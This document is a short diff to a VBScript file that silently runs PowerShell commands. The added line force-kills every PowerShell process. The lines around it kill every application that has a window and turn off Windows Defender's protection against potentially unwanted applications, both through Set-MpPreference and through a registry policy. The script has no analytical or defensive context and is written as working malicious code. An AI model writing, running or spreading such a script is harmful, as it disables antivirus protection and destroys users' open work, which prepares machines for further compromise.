@@ -1,4 +1,5 @@
 Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Set-MpPreference -PUAProtection 0", 0, True
 objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0", 0, True
